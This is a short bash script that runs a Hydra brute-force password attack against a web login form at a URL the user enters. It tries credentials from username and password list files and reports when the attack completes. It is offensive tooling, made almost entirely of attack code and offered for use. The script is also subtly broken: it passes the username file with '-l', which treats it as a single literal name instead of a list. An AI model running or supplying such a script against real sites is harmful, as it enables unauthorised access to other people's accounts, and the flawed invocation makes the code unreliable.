#!/bin/bash

# Prompt the user to enter the target URL
read -p "Enter the target URL: " url

# Prompt the user to enter the login page endpoint
read -p "Enter the login page endpoint: " login_page

# Set the username and password lists
user_list="users.txt"
pass_list="passwords.txt"

# Check if Hydra is installed
if ! [ -x "$(command -v hydra)" ]; then
  echo "Error: Hydra is not installed." >&2
  exit 1
fi

# Perform the brute-force attack
echo "Running brute-force attack with Hydra..."
hydra -l "$user_list" -P "$pass_list" -s 80 "$url" http-post-form "$login_page:user=^USER^&pass=^PASS^:F=incorrect"

echo "Brute-force attack complete!"
